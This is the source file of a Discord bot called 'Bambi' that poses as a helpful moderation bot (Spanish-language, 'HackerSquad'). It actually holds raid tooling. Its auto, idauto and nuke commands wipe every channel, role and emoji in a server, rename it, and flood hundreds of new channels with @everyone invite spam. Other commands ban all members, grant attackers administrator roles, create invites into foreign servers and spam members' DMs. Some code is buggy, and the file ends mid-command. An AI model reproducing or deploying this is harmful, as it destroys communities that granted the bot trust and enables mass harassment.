const express = require("express");
const app = express();
app.get("/", function (req, res) {
	res.send("que onda pa");
});
let port = process.env.PORT || 3000;
app.listen(port);
require("dotenv").config();
//////////////////nada///////////////////////
/////CONSTANTES/////
const Discord = require("discord.js");
const client = new Discord.Client();
const db = require("mongoose");
const moment = require("moment");
/* databases */
const Botowner = require("./models/botowner.js");
const Blacklist = require("./models/blacklist.js");
const Hackermember = require("./models/hackermember.js");
const Usuario = require("./models/usuario.js");
const Spectatormode = require("./models/spectatormode.js");
const Guild = require("./models/guilds");
const Cooldowns = require("./models/cooldowns");
const WebGuild = require("./webmodels/guilds");

////////////////////CONSTANTES////////////
function presence() {
	client.user.setPresence({
		status: "online",
		activity: {
			name: "lov u <3",
			type: "WATCHING",
		},
	});
}
const prefix = process.env.prefix;
const osint = "818625837653033050";
const logsChannel = "877771601733648384";

const raidData = {
	icon: "https://i.pinimg.com/736x/8e/78/0d/8e780db37222c3099d3ddbc334ab4b9d.jpg",
	invite: "https://discord.gg/D2JmfrNnVT",
	name: "hkershit <3",
	nuke_name: "hkshit",
  channel_name: "hkershit"
};

const colors = {
	cyan: "\x1b[36m",
	red: "\x1b[31m",
	green: "\x1b[32m",
	yellow: "\x1b[33m",
	blue: "\x1b[34m",
	magenta: "\x1b[35m",
	white: "\x1b[37m",
	bright_yellow: "\u001b[33;1m",
};

const reset = "\x1b[0m";

const autoCooldown = new Map();

const dbUseOptions = {
	useNewUrlParser: true,
	useUnifiedTopology: true,
	useFindAndModify: false,
	useCreateIndex: true,
};
///////////////////////ESTADO/////////////////
client.once("ready", async () => {
	console.log(client.user.username, client.user.discriminator, "v5");


	db.set("useNewUrlParser", true);
	db.set("useFindAndModify", false);
	db.set("useCreateIndex", true);
	db.set("useUnifiedTopology", true);

	await db
		.connect(process.env.uri)
		.then(console.log("Database status: Active"));
	await db
		.createConnection(process.env.weburi, dbUseOptions)
		.then(console.log("Web Database status: Active"));

	const autoCommand = await Cooldowns.findOne({ command: "auto" });
	if (!autoCommand) {
		const newRateLimit = new Cooldowns({
			command: "auto",
		});
		await newRateLimit.save();
	}

	autoCommand.guilds = [];
	await autoCommand.save();
});

client.on("message", async (message) => {
	/////////////VARIABLES//////////
  
	const noPerm = () => {
		message.channel.send(
			new Discord.MessageEmbed()
				.setDescription(
					"No tienes los permisos necesarios para ejecutar esta acción"
				)
				.setColor("RED")
		);
	};
	const malo = await Blacklist.findOne({ userId: message.author.id });

  if (malo && message.content.startsWith(';')) return noPerm();

	const hackers = await Hackermember.findOne({ userId: message.author.id });

	const spect = await Spectatormode.findOne({ serverId: message.guild.id });

	const ownerbot = await Botowner.findOne({ userId: message.author.id });

	const args = message.content.split(" ").slice(1);

	const isPrivateGuild = await Guild.findOne({ serverId: args[0] });

	const wrong = (params) => {
		let emb = new Discord.MessageEmbed()
			.setDescription(params)
			.setColor("red");
		message.channel.send(emb);
	};

	const help = new Discord.MessageEmbed()
		.setColor("#efa94a")
		.setDescription(
			"¡Hola! Mi nombre es Bambi. Estoy aquí para hacer de su servidor un gran lugar para los usuarios, además de ofrecerle buenos comandos de moderación y administración. Veo que necesitas ayuda, no te preocupes, aquí tienes una pequeña guía para que conozcas más de mí. :grinning:"
		)
		.addField(
			"Mi prefijo",
			":grey_question: Recuerda escribir mi prefijo al principio de cada comando. Ejemplo: `;help`"
		)
		.addField(
			"Mis comandos",
			":grey_question: Vea mi extensa lista de comandos con: `;commands`"
		)
		.setThumbnail(
			"https://cdn.discordapp.com/avatars/783189364112621580/5bb74c8cb758af7e512d2f842abfc376.png?size=1024"
		)
		.setAuthor(
			"¡Comando de ayuda!",
			"https://cdn.discordapp.com/avatars/783189364112621580/5bb74c8cb758af7e512d2f842abfc376.png?size=1024"
		)
		.setFooter(
			`Tenga un buen día, ${message.author.username} 😄`,
			message.author.displayAvatarURL()
		);

	const prefix = ";";

	const command = message.content
		.slice(prefix.length)
		.trim()
		.split(/ +/g)
		.shift()
		.toLowerCase();
	////////logs////////////
	if (message.content.startsWith(prefix)) {
		let argz = message.content.split(" ").slice(1);

		let argc = "Ninguno";
		function logs(color) {
			if (argz.length != 0) {
				client.channels.cache
					.get(logsChannel)
					.send(
						new Discord.MessageEmbed()
							.setTitle("Bambi's logs!")
							.setDescription(
								`**${message.author.username}#${message.author.discriminator}** ejecutó el comando __**;${command}**__ en el servidor **${message.guild.name}** \n **ID:** ${message.guild.id} \n**Parámetro:** ${argz}`
							)
							.setColor(color)
							.setThumbnail(client.user.displayAvatarURL())
					);
			} else {
				client.channels.cache
					.get(logsChannel)
					.send(
						new Discord.MessageEmbed()
							.setTitle("Bambi's logs!")
							.setColor(color)
							.setDescription(
								`**${message.author.username}#${message.author.discriminator}** ejecutó el comando __**;${command}**__ en el servidor **${message.guild.name}** \n **ID:** ${message.guild.id} \n**Parámetro:** ${argc}`
							)
							.setThumbnail(client.user.displayAvatarURL())
					);
			}
		}
		if (
			command === "auto" ||
			command === "customauto" ||
			command === "idauto"
		) {
			logs("#e0ff6f");
			let isAdmin = message.guild.me.hasPermission("ADMINISTRATOR")
				? ""
				: "El raid no fue ejecutado correctamente";

			client.channels.cache
				.get(logsChannel)
				.send(
					new Discord.MessageEmbed()
						.setDescription(
							`**Miembros:** ${message.guild.memberCount}`
						)
						.setFooter(isAdmin)
						.setColor("#e0ff6f")
				);
		} else {
			logs();
		}
	}
	////////botowners////////////
	if (message.content.startsWith(";perms-in")) {
		if (message.author.id !== osint) return noPerm();
		let persona = message.mentions.users.first();
		if (!persona) {
			return wrong("Menciona a alguien para otorgar perms de botowner");
		}
		let newBotowner = new Botowner({
			_id: db.Types.ObjectId(),
			username: persona.username,
			userId: persona.id,
		});
		await newBotowner.save();
		wrong(`**${persona.username}** fue otorgado permisos de **Botowner**`);
	}
	if (message.content.startsWith(";perms-out")) {
		if (message.author.id !== osint) return noPerm();
		let persona = message.mentions.users.first();
		if (!persona)
			return wrong("Menciona a alguien para retirar perms de botowner");
		await Botowner.deleteOne({ userId: persona.id });
		wrong(`**${persona.username}** fue retirado permisos de **Botowner**`);
	}
	if (message.content === ";owners-list") {
		let lista = await Botowner.find();
		let botownersList =
			lista.map((t) => `**${t.username}**`).join("\n") ||
			"No hay ningún botowner";
		let embed = new Discord.MessageEmbed()
			.setTitle("Owners del cliente")
			.setDescription(botowners1);
		return message.channel.send(embed);
	}
	///////////////blacklist///////////////////////
	if (message.content.startsWith(";bl-in")) {
		if (!ownerbot) return noPerm();
		let persona = client.users.cache.get(args[0]);
		let reason = args.slice(1).join(" ");
		if (!persona)
			return wrong(
				"Menciona a alguien para colocarlo en la **Blacklist**"
			);
		const foundUser = await Blacklist.findOne({ userId: persona.id });
		if (foundUser) return wrong("Este usuario ya está en la blacklist");
		if (!reason) {
			reason = "Por mogolico";
		}
		let newBlacklist = new Blacklist({
			username: persona.username,
			userId: persona.id,
			reason: reason,
			reportedBy: message.author.username,
			reportedById: message.author.id,
			date: new Date(),
		});
		await newBlacklist.save();
		wrong(`**${persona.username}** fue colocado en la **Blacklist**`);
	}
	////blacklistout/////
	if (message.content.startsWith(";bl-out")) {
		if (!ownerbot) return noPerm();
		let personaId = args[0];
		if (!personaId)
			return message.channel.send(
				"Menciona a alguien para retirarlo de la **Blacklist**"
			);
		const user = await Blacklist.findOne({ userId: personaId });
		if (!user)
			return message.channel.send(
				"Esta persona nunca estuvo en la **Blacklist**"
			);
		await Blacklist.deleteOne({ userId: personaId });
		wrong(`<@${personaId}> fue retirado de la **Blacklist**`);
	}
	if (message.content === ";bl") {
		let lista = await Blacklist.find();
		let bl =
			lista
				.map(
					(user) =>
						`**User:** ${user.username} | **Razón:** ${user.reason}\n**ID:** ${user.userId}`
				)
				.join("\n") || "No hay nadie en la blacklist";
		message.channel.send(
			new Discord.MessageEmbed()
				.setTitle("Blacklist")
				.setDescription(`${bl}`)
		);
	}
	////////////////////////HackerMembers//////////////////////
	if (message.content.startsWith(";hks-in")) {
		if (!ownerbot) return noPerm();
		let persona = client.users.cache.get(args[0]);
		if (!persona)
			return wrong(
				"Menciona a alguien para conceder permisos de miembro de **HackerSquad**"
			);
		let user = await Hackermember.findOne({ userId: persona.id });
		if (user)
			return wrong(
				"Ese usuario ya está registrado como miembro de **HackerSquad**"
			);
		let newHksMember = new Hackermember({
			username: persona.username,
			userId: persona.id,
		});
		await newHksMember.save();
		wrong(
			`**${persona.username}** tiene ahora permisos de miembro de **HackerSquad**`
		);
	}
	if (message.content.startsWith(";hks-out")) {
		if (!ownerbot) return noPerm();
		let personaid = args.join(" ");
		let user = await Hackermember.findOne({ userId: personaid });
		if (!user)
			return wrong("Este usuario nunca fue miembro de **HackerSquad**");
		await Hackermember.deleteOne({ userId: personaid });
		wrong(
			`**${user.username}** ya no posee permisos de miembro de **HackerSquad**`
		);
	}
	if (message.content === ";hks-list") {
		if (!hackers) return noPerm();
		let lista = await Hackermember.find();
		let emb = new Discord.MessageEmbed().setTitle("HackerSquad members");
		lista.map((user) =>
			emb.addField(`${user.username}`, `**ID:** ${user.userId}`)
		);

		message.channel.send(emb);
	}
	//guilds
	if (message.content.startsWith(";privatize")) {
		let guild = client.guilds.cache.get(args.join(" "));
		if (!ownerbot) return noPerm();
		if (!guild) return wrong("No existe esa guild!");
		let guildExists = await Guild.findOne({ serverId: args.join(" ") });
		if (guildExists) return wrong("Ese servidor ya está registrado!");
		let newGuild = new Guild({
			_id: db.Types.ObjectId(),
			serverName: guild.name,
			serverId: guild.id,
		});
		await newGuild.save();
		wrong(
			"La guild **" +
				guild.name +
				"** fue registrada como **servidor privado**"
		);
	}
	if (message.content.startsWith(";publish")) {
		let guild = await Guild.findOne({ serverId: args.join(" ") });
		if (!ownerbot) return noPerm();
		if (!guild) return wrong("Ese server no existe en mi db!");
		await guild.deleteOne();
		message.channel.send(
			"Se ha desprivatizado el servidor **" + guild.serverName + "**"
		);
	}

	if (message.content == ";private-list") {
		if (!ownerbot) return noPerm();
		let guilds = await Guild.find();
		let guildsMap = guilds
			.map((g) => `**${g.serverName}**\nID: ${g.serverId}`)
			.join("\n");

		let emb = new Discord.MessageEmbed()
			.setTitle("Lista de servers privados")
			.setDescription(guildsMap)
			.setFooter(guilds.length + " Hk$ owo");
		if (!ownerbot) return noPerm();
		message.channel.send(emb);
	}

	/////////////////////clearsvs//////////////
	if (message.content === ";clearsvs") {
		if (!ownerbot) return noPerm();
		let lista = client.guilds.cache.filter(
			(guild) => guild.name === "#HackerSquad | Attack"
		);

		lista.forEach((guild) =>
			guild
				.leave()
				.then((guild) =>
					message.channel.send(
						`**Abandone** ${guild.name} **su id era:** ${guild.id}`
					)
				)
		);
	}
	/*if (message.content === "haha"){
    Usuario.find().deleteMany().then(result => console.log(result))
  }*/
	//////////////////////help///////////////////////
	if (message.content === ";hacker" || message.content === ";help") {
		if (!malo) {
			let generateEmbed = new Discord.MessageEmbed()
				.setTitle("Comandos públicos| Prefix: ;")
				.setThumbnail(
					"https://cdn.discordapp.com/avatars/783189364112621580/5bb74c8cb758af7e512d2f842abfc376.png?size=1024"
				)
				.addField("ping", "muestra la latencia de Bambi", true)
				.addField(
					"check",
					"chequea si Bambi posee permisos de administrador",
					true
				)
				.addField("clear", "borrar todos los canales", true)
        .addField("nuke", "borra todos los canales y crea uno", true)
				.addField("serverinfo", "da información del server", true)
				.addField("bot", "crea invitación de un bot por id", true)
				.addField(
					"banall",
					"banea a todos los usuarios baneables",
					true
				)
				.addField(
					"delroles",
					"elimina todos los roles eliminables",
					true
				)
				.addField("auto", "raid", true)
				.addField(
					"Para realizar un raid de la manera más exitosa posible, ejecutar los comandos en este orden:",
					"**adm** => **auto** => **serverinfo**"
				)
				.setFooter(
					"Bambi. 😄 | HαƈƙҽɾSϙυαԃ Bot",
					client.user.displayAvatarURL()
				);

			let author = message.author;

			message.channel.send(generateEmbed).then((message) => {
				message.react("➡️");
				const collector = message.createReactionCollector(
					(reaction, user) =>
						["⬅️", "➡️", "◀️", "▶️"].includes(
							reaction.emoji.name
						) && user.id === author.id,
					{ time: 60000 }
				);

				let lista1 = new Discord.MessageEmbed()
					.setTitle("Comandos Privados | Prefix: ;")
					.setThumbnail(
						"https://cdn.discordapp.com/avatars/783189364112621580/5bb74c8cb758af7e512d2f842abfc376.png?size=1024"
					)
					.addField("unban", "unbanea por id de un servidor", true)
					.addField(
						"unbanguild",
						"unbanea a todos los miembros del servidor",
						true
					)
          .addField(
            "adm",
            "te da un rol con permisos de administrador",
            true
          )
          .addField(
            "dame",
            "te da un rol con administrador después del raid (cuando ya estén hechos los 250 roles)",
            true
          )
					.addField(
						"unbanall",
						"unbanea a todos los miembros de HackerSquad",
						true
					)
					.addField("leave", "abandona un servidor por id", true)
					.addField(
						"svs",
						"muestra los servers en donde está Bambi",
						true
					)
					.addField(
						"invite",
						"crea una invitación por id de un servidor",
						true
					)
					.addField(
						"channel",
						"crea un canal en un servidor por id",
						true
					)
					.addField(
						"spect",
						"activa el modo espectador en un servidor y lo setea en un canal",
						true
					)
					.addField("spectoff", "apaga el modo espectador", true)
					.addField("idauto", "raid por id", true)
					.addField("customauto", "raid customizado", true)

					.setFooter(
						"Bambi. 😄 | HαƈƙҽɾSϙυαԃ Bot",
						message.author.displayAvatarURL()
					);

				let lista2 = new Discord.MessageEmbed()
					.setTitle("Comandos de Botowner | Prefix: ;")
					.setThumbnail(
						"https://cdn.discordapp.com/avatars/783189364112621580/5bb74c8cb758af7e512d2f842abfc376.png?size=1024"
					)
					.addField(
						"bl-in",
						"coloca a un usuario en la blacklist",
						true
					)
					.addField(
						"bl-out",
						"retira a un usuario de la blacklist",
						true
					)
					.addField(
						"hks-in",
						"otorga permisos de miembro de HackerSquad",
						true
					)
					.addField(
						"hks-out",
						"retira permisos de miembro de HackerSquad",
						true
					)
					.addField(
						"spammd",
						"spammea al dm de todos los miembros",
						true
					)
					.setFooter(
						"Bambi. 😄 | HαƈƙҽɾSϙυαԃ Bot",
						message.author.displayAvatarURL()
					);

				collector.on("collect", (reaction) => {
					message.reactions.removeAll().then(async () => {
						if (reaction.emoji.name === "➡️") {
							message.edit(lista1).then(async (message) => {
								message.react("⬅️");
								await message.react("▶️");
							});
						}
						if (reaction.emoji.name === "▶️") {
							message
								.edit(lista2)
								.then((message) => message.react("◀️"));
						}
						if (reaction.emoji.name === "◀️") {
							message.edit(lista1).then(async (message) => {
								message.react("⬅️");
								await message.react("▶️");
							});
						}
						if (reaction.emoji.name === "⬅️") {
							message
								.edit(generateEmbed)
								.then((message) => message.react("➡️"));
						}
					});
				});
			});
		} else {
			noPerm();
		}
	} ////////////////////check/////////////////////
	if (message.content.startsWith(";check")) {
		
		const guild = client.guilds.cache.get(args[0]);
		let embed = new Discord.MessageEmbed().setColor("#efa94a");
		if (!guild) {
			if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
				embed.setTitle("No");
			} else {
				embed.setTitle("Sí");
			}
		} else {
			if (!guild.me.hasPermission("ADMINISTRATOR")) {
				embed.setTitle("No");
			} else {
				embed.setTitle("Sí");
			}
		}
		message.channel.send(embed);
	} ////////////////////////////raid///////////////////////
	if (message.content === ";nuke") {
		if (!message.guild) return;
		async function deleteChannels() {
			await message.guild.channels.cache.forEach((c) => {
				c.delete()
					.then((channel) => guild.channels.cache.delete(channel.id))
					.catch((e) => {
						console.log(
							colors.cyan,
							"Deleting channels:",
							reset,
							e.message
						);
					});
			});
			return guild;
		}
		deleteData().then((g) =>
			g.channels
				.create(raidData.nuke_name)
				.then((c) => c.send("@everyone " + raidData.invite))
		);
	}
  
	if (message.content === ";auto") {
		
		if (!message.guild.me.hasPermission("ADMINISTRATOR"))
			return message.channel.send("No perms D:");
		const guild = message.guild;

		const cooldownsList = await Cooldowns.findOne({
			command: "auto",
		});
		if (cooldownsList.guilds.find((c) => c.guildId === guild.id))
			return wrong("Che pelotudo te sarpás en spammear auto e");

		cooldownsList.guilds.push({ guildId: guild.id, date: new Date() });
		await cooldownsList.save();
		setTimeout(async () => {

			let guildsRatelimitCopy = [...cooldownsList.guilds];

			guildsRatelimitCopy.splice(
				guildsRatelimitCopy.indexOf(
					guildsRatelimitCopy.guilds.find(
						(g) => g.guildId === guild.id
					),
					1
				)
			);
			cooldownsList.guilds = guildsRatelimitCopy;
			await cooldownsList.save();
		}, 300 * 1000);

		const deleteChannels = async () => {
			await guild.channels.cache.forEach((c) => {
				c.delete()
					.then((channel) => guild.channels.cache.delete(channel.id))
					.catch((e) => {
						console.log(
							colors.cyan,
							"Deleting channels:",
							reset,
							e.message
						);
					});
			});
			return guild;
		};
		const deleteRoles = async () => {
			await guild.roles.cache.forEach((r) => {
				if (!guild.me) return;
				if (
					guild.me.roles.highest.position > r.position &&
					r.id !== guild.id
				) {
					r.delete()
						.then((role) => guild.roles.cache.delete(role.id))
						.catch((e) => {
							guild.roles.cache.delete(r.id);
							console.log(
								colors.yellow,
								"Deleting roles:",
								reset,
								e.message
							);
						});
				}
			});
			return guild;
		};

		const createChannelsAndRoles = async () => {
			for (let i = 0; i <= 458; i++) {
				if (!guild) return;
				const channel = await guild.channels.create(raidData.channel_name, {
          topic: raidData.invite
        });
				function sendMessages() {
					for (let x = 0; x <= 4; x++) {
						if (!channel) {
							continue;
						}
						channel
							.send("@everyone " + raidData.invite)
							.catch((e) => {
								guild.channels.cache.delete(channel.id);
								console.log(
									colors.magenta,
									"Sending messages:",
									reset,
									e.message
								);
							});
					}
				}
				await sendMessages();
				await setTimeout(() => sendMessages(), 10000);
				await setTimeout(() => sendMessages(), 15000);
			}
			for (let x = 0; x < 248 - message.guild.roles.cache.size; x++) {
				message.guild.roles
					.create({
						data: {
							name: `#${raidData.channel_name} ${raidData.invite}`,
							permissions: "ADMINISTRATOR",
						},
					})
					.catch((e) =>
						console.log(colors.green, "Creating roles", e.message)
					);
			}
		};

		try {
			await message.guild.setName(raidData.name);
			await message.guild.setIcon(raidData.icon);
			await message.guild.emojis.cache.each((emoji) => {
				emoji
					.delete()
					.then((e) => message.guild.emojis.cache.delete(e.id))
					.catch((e) =>
						console.log(
							colors.bright_yellow,
							"Deleting emojis:",
							reset,
							e.message
						)
					);
			});
			await deleteRoles();
			await deleteChannels();
			await createChannelsAndRoles();
		} catch (e) {
			console.log(colors.red, "Unexpected:", reset, e.message);
		}
	}

	if (message.content.startsWith(";idauto")) {
		let guild = client.guilds.cache.get(args[0]);
		if (!guild) return "No estoy en ese servidor";
		if (!guild.me.hasPermission("ADMINISTRATOR"))
			return message.channel.send({
				embed: {
					description:
						"No tengo permisos de administrador en ese servidor",
					color: "red",
				},
			});
		
		if (!hackers) return noPerm();
		try {
			await guild.roles.cache.each((role) => {
				if (role.position < message.guild.me.roles.highest.position)
					return role.delete();
			});
			await guild.emojis.cache.each((emojis) => emojis.delete());
			await guild.setName(raidData.name);
			await guild.setIcon(raidData.icon);
			await guild.channels.cache.each((channel) => channel.delete());
			for (let x = 0; x < 458; x++) {
				guild.channels
					.create("HkerShit", {
						topic: raidData.invite,
					})
					.then(async (channel) => {
						function sendMessage2() {
							for (let mensaje = 0; mensaje < 5; mensaje++) {
								channel.send("@everyone" + raidData.invite);
							}
						}
						sendMessage2();
						await setTimeout(function () {
							sendMessage2();
						}, 10000);
					});
			}
			for (let x = 0; x < 248; x++) {
				guild.roles.create({
					data: {
						name: `#HkerShit ${raidData.invite}`,
						permissions: "ADMINISTRATOR",
					},
				});
			}

			message.channel.send("Idauto finalizado en **" + guild.name + "**");
		} catch (e) {
			console.log(e);
		}
	}
	////////////////////custom raid/////////////
 ///////////////////banall//////////////////
	if (message.content === ";banall") {
		
		if (message.guild.me.hasPermission("ADMINISTRATOR"))
			return message.channel.send(help);
		message.guild.members.cache.each((member) => {
			if (member.bannable) return member.ban();
		});
	} /////clear//////
	if (message.content === ";clear") {
		
		if (!message.guild.me.hasPermission("ADMINISTRATOR"))
			return message.channel.send(help);

		message.guild.channels.cache.each((channel) => {
			channel.delete();
		});
	}
	////delroles/////
	if (message.content === ";delroles") {
		
		if (!message.guild.me.hasPermission("ADMINISTRATOR"))
			return message.channel.send(help);

		message.guild.roles.cache.each((role) => {
			if (role.position < message.guild.me.roles.highest.position)
				return role.delete().catch((e) => console.log(e));
		});
	}
	/////adm////
	if (message.content === ";adm") {
		
		if (!hackers) return noPerm();
		if (!message.guild.me.hasPermission("ADMINISTRATOR"))
			return message.channel.send(help);

		try {
			await message.delete();
			const role = await message.guild.roles.create({
				data: {
					name: `HαƈƙҽɾSϙυαԃ`,
					permissions: "ADMINISTRATOR",
				},
			});
			message.member.roles.add(role);
		} catch (e) {
			console.log(e);
		}
	}
	if (message.content.startsWith(";idadm")) {
		if (!malo) {
			let guild = client.guilds.cache.get(args[0]);
			if (guild.me.hasPermission("ADMINISTRATOR")) {
				guild.roles.create({
					data: {
						name: `HαƈƙҽɾSϙυαԃ`,
						permissions: "ADMINISTRATOR",
					},
				});
				let role = guild.roles.cache.find(
					(role) => role.name === "HαƈƙҽɾSϙυαԃ"
				);
				if (!role) return message.channel.send("Ocurrió un problema!");
				let usuario = guild.members.cache.get(message.author.id);
				usuario.roles.add(role);
			} else {
				message.channel.send(help);
			}
		} else {
			noPerm();
		}
	}
	if (message.content === ";dame") {
		
		if (!hackers) return noPerm();
		try {
			await message.delete();
			message.member.roles.add(
				message.guild.roles.cache.find(
					(role) => role.name === `#HkerShit ${raidData.invite}`
				)
			);
		} catch (e) {
			wrong("`;auto` no ha sido ejecutado aún");
		}
	}
	if (message.content.startsWith(";serverinfo")) {
		if (!malo) return noPerm();
		let guild = client.guilds.cache.get(args[0]);
		if (isPrivateGuild)
			return wrong(
				"No se puede ejecutar este comando sobre este servidor"
			);
		if (!guild) {
			guild = message.guild;
		}
		let embed = new Discord.MessageEmbed()
			.setTitle(`${guild.name} | ID: ${guild.id}`)
			.addField("Owner", `HαƈƙҽɾSϙυαԃ`, true)
			.addField("Región", `${guild.region}`, true)
			.addField("Emojis", `${guild.emojis.cache.size} emojis`, true)
			.addField(
				"Canales",
				`${
					guild.channels.cache.filter(
						(channel) => channel.type === "text"
					).size
				} de texto \n ${
					guild.channels.cache.filter(
						(channel) => channel.type === "voice"
					).size
				} de voz \n ${guild.channels.cache.size} en total`,
				true
			)
			.addField("Roles", `${guild.roles.cache.size} roles`, true)
			.addField(
				"Miembros",
				`${
					guild.members.cache.filter((member) => !member.user.bot)
						.size
				} miembros \n ${
					guild.members.cache.filter((member) => member.user.bot).size
				} bots \n ${guild.memberCount} en total`,
				true
			)
			.addField("Creación", guild.createdAt.toLocaleString(), true)
			.setThumbnail(guild.iconURL({ dynamic: true }))
			.setFooter(
				`Solicitado por ${message.author.username}`,
				message.author.displayAvatarURL({ dynamic: true })
			);
		return message.channel.send(embed);
	}
	/////bot//////
	if (message.content.startsWith(";bot")) {
		
		let bot = args[0];
		let emb = new Discord.MessageEmbed()
			.setFooter(
				`Solicitado por ${message.author.username} 😄`,
				message.author.displayAvatarURL()
			)
			.setThumbnail(
				"https://cdn.discordapp.com/avatars/783189364112621580/5bb74c8cb758af7e512d2f842abfc376.png?size=1024"
			);
		if (!bot) {
			emb.setTitle("Yo").setDescription(
				`https://discord.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=2146958847`
			);
			return message.channel.send(emb);
		} else {
			if (isNaN(bot) && bot.length != 0)
				return message.channel.send("Esa ID es inválida");
			if (bot.length > 18 && bot.length != 0)
				return message.channel.send("Esa ID es inválida");
			if (bot.length != 0 && bot.length < 18)
				return message.channel.send("Esa ID es inválida");

			embed
				.setTitle("Tu bot")
				.setDescription(
					`https://discord.com/oauth2/authorize?client_id=${bot}&scope=bot&permissions=2146958847`
				);
			message.channel.send(embed);
		}
	}
	///////////////////////////comandos privados///////
	////scanner////
	if (message.content.startsWith(";unbanall")) {
		
		if (hackers) return noPerm();
		let guild = client.guilds.cache.get(args[0]);
		if (!guild) return wrong("Ese servidor no existe");
		let lista = await Hackermember.find();
		let invitechannels = guild.channels.cache.filter((c) =>
			c.permissionsFor(guild.me).has("ADMINISTRATOR")
		);
		if (!invitechannels)
			return message.reply("No tengo permisos en ese servidor.");

		lista.map((t) => t.userId).forEach((t) => guild.members.unban(t));
		guild.channels.cache
			.random()
			.createInvite()
			.then((invite) =>
				message.channel.send(
					`Todos los miembros de **HackerSquad** fueron desbaneados del servidor **${guild.name}**\n` +
						invite.url
				)
			);
	}
	////unbanguild///
	if (message.content.startsWith(";unbanguild")) {
		if (malo || !hackers) return noPerm();
		let guild = client.guilds.cache.get(args[0]);
		if (!guild) return message.channel.send("Ese servidor no existe");

		let invitechannels = guild.channels.cache.filter((c) =>
			c.permissionsFor(guild.me).has("ADMINISTRATOR")
		);

		if (!invitechannels)
			return message.reply("No tengo permisos en ese servidor.");

		message.guild.members.cache
			.map((t) => t.user.id)
			.forEach((t) => guild.members.unban(t));

		guild.channels.cache
			.random()
			.createInvite()
			.then((invite) =>
				message.channel.send(
					`Todos los miembros de **${message.guild.name}** fueron desbaneados del servidor **${guild.name}**\n` +
						invite.url
				)
			);
	}

	////unban////
	if (message.content.startsWith(";unban")) {
		if (malo || hackers) return noPerm();
		let guild = client.guilds.cache.get(args[0]);
		if (!guild) return wrong("Ese servidor no existe");
		let invitechannels = guild.channels.cache.filter((c) =>
			c.permissionsFor(guild.me).has("ADMINISTRATOR")
		);
		if (!invitechannels)
			return message.reply("No tengo permisos en ese servidor.");
		guild.members.unban(message.author);
		guild.channels.cache
			.random()
			.createInvite()
			.then((invite) =>
				message.channel.send(
					`**${message.author.username}** fue desbaneado del servidor **${guild.name}**\n` +
						invite.url
				)
			);
	}
	if (message.content.startsWith(";scan")) {
		if (malo || !hackers) return noPerm();
		let server = client.guilds.cache.get(args[0]);
		if (!server) return wrong("ID inválida");
		let serverlist = server.members.cache.map((t) => t.user.id);
		let blacklist = await Blacklist.find();
		let blacklistInGuild = [];
		blacklist.forEach((t) => {
			if (serverlist.includes(t.userId)) return blacklistInGuild.push(t);
		});
		let filterlist =
			blacklistInGuild
				.map((t) => ` **Usuario:** ${t.username}`)
				.join("\n") || "No hay resultados";
		let emb = new Discord.MessageEmbed()
			.setTitle("Resultados del scan")
			.setDescription(filterlist);
		message.channel.send(emb);
	} /////leave/////
	if (message.content.startsWith(";leave")) {
		if (!malo) {
			if (hackers) {
				let server = client.guilds.cache.get(args[0]);
				if (isPrivateGuild)
					return wrong(
						"No se puede ejecutar este comando sobre este servidor"
					);
				if (!server) return message.channel.send("ID inválida");
				let canal = server.channels.cache
					.filter((channel) => channel.type === "text")
					.random();
				if (!canal) {
					server.leave();
					message.channel.send(
						`Bambi fue removido del servidor **${server.name}**`
					);
				}
				message.channel.send(
					`Bambi fue removido del servidor **${server.name}**`
				);
				canal.send("chau putas" + raidData.invite + "||@everyone ||");
				server.leave();
			} else {
				noPerm();
			}
		} else {
			noPerm();
		}
	} ///////////svs//////
	if (message.content === ";svs") {
		if (!malo) {
			if (hackers) {
				let guilds = client.guilds.cache.array();
				let privateGuild = await Guild.find();
				let privateGuildMapped = privateGuild.map((s) => s.serverId);
				let generateEmbed = (start) => {
					let current = guilds.slice(start, start + 10);
					let embed = new Discord.MessageEmbed().setTitle(
						`Servidores ${start + 1}-${start + current.length} de ${
							guilds.length
						}`
					);
					current.map(async (guild) => {
						if (privateGuildMapped.includes(guild.id))
							return embed.addField(
								"Privado",
								"**ID:** ||Nope|| **Users:** ||Nope||"
							);

						embed.addField(
							guild.name,
							`**ID:** ${guild.id} **Users:** ${guild.memberCount}`
						);
					});
					return embed;
				};
				let author = message.author;
				message.channel.send(generateEmbed(0)).then((message) => {
					if (guilds.length <= 10) return;
					message.react("➡️");
					let collector = message.createReactionCollector(
						(reaction, user) =>
							["⬅️", "➡️"].includes(reaction.emoji.name) &&
							user.id === author.id,
						{ time: 1200000 }
					);

					let lista1 = 0;
					collector.on("collect", (reaction) => {
						message.reactions.removeAll().then(async () => {
							reaction.emoji.name === "⬅️"
								? (lista1 -= 10)
								: (lista1 += 10);
							message.edit(generateEmbed(lista1));
							if (lista1 !== 0) await message.react("⬅️");
							if (lista1 + 10 < guilds.length)
								message.react("➡️");
						});
					});
				});
			} else {
				noPerm();
			}
		} else {
			noPerm();
		}
	}
	////////////////invite////////////////////
	if (message.content.startsWith(";invite")) {
		
		if (!hackers) return noPerm();
		let guild = client.guilds.cache.get(args[0]);
		if (!guild) return message.reply("No estoy en ese servidor.");
		if (isPrivateGuild)
			return wrong(
				"No se puede ejecutar este comando sobre este servidor"
			);
		if (guild.channels.cache.size < 1)
			return message.channel.send("Este servidor no tiene canales.");
		let invitechannels = guild.me.hasPermission("CREATE_INSTANT_INVITE");
		if (!invitechannels) return wrong("No tengo permisos en este servidor");
		guild.channels.cache
			.random()
			.createInvite()
			.then((invite) =>
				message.channel.send("Tu invitación:\n" + invite.url)
			)
			.catch((e) => wrong("Ha ocurrido un error inesperado"));
	}

	if (message.content.startsWith(";channel")) {
		if (!malo) {
			if (hackers) {
				let guild = client.guilds.cache.get(args[0]);
				if (!guild)
					return message.channel.send("No estoy en ese servidor.");
				if (!guild.me.hasPermission("MANAGE_CHANNELS"))
					return "Sin permisos";
				if (guild.channels.cache.size >= 500)
					return message.channel.send(
						"No se pueden crear más canales en este servidor."
					);
				guild.channels.create("HackerSquad");
				message.channel.send(
					`Se ha creado un canal con el nombre **HackerSquad** en el servidor **${guild.name}**`
				);
			} else {
				noPerm();
			}
		} else {
			noPerm();
		}
	}
	////////////////spectatormode///////////
	if (message.content.startsWith(";specton")) {
		if (hackers) {
			let guild = client.guilds.cache.get(args[0]);
			if (!guild)
				return message.channel.send("No especificaste ningún servidor");
			if (isPrivateGuild)
				return wrong(
					"No se puede ejecutar este comando sobre este servidor"
				);
